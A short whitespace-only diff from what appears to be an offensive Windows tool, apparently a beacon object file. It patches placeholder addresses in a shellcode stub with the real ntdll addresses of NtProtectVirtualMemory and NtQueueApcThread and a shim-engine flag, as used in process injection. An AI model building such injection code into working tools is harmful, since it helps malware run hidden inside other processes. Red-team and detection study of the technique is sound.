@@ -153,15 +153,15 @@ void update_stub_pointers(PVOID g_ShimsEnabled, PVOID ApcRoutine) {
 
 	ULONGLONG stub_RtlEqualUnicodeString =	0xAAAAAAAAAAAAAAAA; 
 	ULONGLONG stub_NtProtectVirtualMemory =	0xBBBBBBBBBBBBBBBB;
-	ULONGLONG stub_NtQueueApcThread =	 	0xCCCCCCCCCCCCCCCC;
-	ULONGLONG stub_ApcRoutine = 			0xDDDDDDDDDDDDDDDD; 
-	ULONGLONG stub_g_ShimsEnabled = 		0xEEEEEEEEEEEEEEEE; 
+	ULONGLONG stub_NtQueueApcThread =	0xCCCCCCCCCCCCCCCC;
+	ULONGLONG stub_ApcRoutine = 		0xDDDDDDDDDDDDDDDD; 
+	ULONGLONG stub_g_ShimsEnabled = 	0xEEEEEEEEEEEEEEEE; 
 
 	HMODULE h = GetModuleHandle("ntdll");
 
 	PVOID RtlEqualUnicodeString =	GetProcAddress(h, "RtlEqualUnicodeString");
 	PVOID NtProtectVirtualMemory =	GetProcAddress(h, "NtProtectVirtualMemory");
-	PVOID NtQueueApcThread = 		GetProcAddress(h, "NtQueueApcThread");
+	PVOID NtQueueApcThread = 	GetProcAddress(h, "NtQueueApcThread");
 
 	for (int i = 0; i < stub_x64_o_len; i++) {
 		if(MSVCRT$memcmp((PVOID)((UINT_PTR)stub_x64_o + i), &stub_RtlEqualUnicodeString, sizeof(stub_RtlEqualUnicodeString)) == 0) {
